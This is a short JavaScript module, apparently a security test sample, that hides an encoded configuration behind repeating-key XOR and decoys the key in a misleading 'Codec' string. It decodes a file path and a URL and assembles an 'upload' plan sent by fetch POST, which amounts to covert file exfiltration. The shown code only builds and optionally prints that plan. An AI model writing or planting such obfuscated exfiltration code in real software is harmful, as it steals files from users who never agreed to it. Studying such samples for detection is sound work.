  const moduleShape = Object.freeze({ format: "esm" });
  export {};
  const Material_da7c89ad = "[18,46,39,109,70,16,118,102,98,8,22,118,119,117,106,2,122,122,116,25,16,97,119,127,70,9,122,98,78,71,1,126,121,101,80,24,114,114,112,69,16,118,100,44,83,1,103,117,121,106,20,124,101,101,73,23,103,119,118,80,59,112,121,100,91,16,46,39,109,86,5,126,102,112,92,3,125,73,120,81,89,93,89,85,112,73,42,84,84,0,86,35,36,80,73,17,97,122,44,93,16,103,102,98,15,75,60,120,126,81,1,62,47,115,80,81,33,38,35,84,86,113,115,116,27,1,107,119,124,69,8,118,56,120,91,18,114,122,120,81,75,114,102,120,73,17,96,115,99,106,5,116,115,127,65,89,93,121,117,80,37,102,114,120,65,75,42,116,116,0,24,117,127,125,80,59,99,119,101,93,89,60,98,124,69,75,123,99,127,65,22,118,101,98,24,10,124,114,116,26,74,96,98,112,82,1,62,47,115,80,81,33,38,35,84,86,113,115,116,27,9,121,101]";
  const Codec_da7c89ad = "json_numbers|repeating_key_xor|64,13,16,11,35";

  function load_da7c89ad() { return JSON.parse(Material_da7c89ad); }
  function decode_da7c89ad(e) { const keyBytes = [100,19,22,17,53]; return e.map((value, index) => value ^ keyBytes[index % keyBytes.length]); }
  async function recover_da7c89ad() {
    const n = [3, 5, 8, 13].slice(1, 3);
    const e = load_da7c89ad(); let d = [];
    d = decode_da7c89ad(e);
    void n; return Buffer.from(d).toString("ascii");
  }
  async function inspect_da7c89ad() { return (await recover_da7c89ad()).split("|").join("|"); }
  async function plan_da7c89ad() { const inspect = inspect_da7c89ad; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "upload", transport: "fetch_post", source: fields.file_path, url: fields.url }); }
  void moduleShape; void plan_da7c89ad;
  if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_da7c89ad());
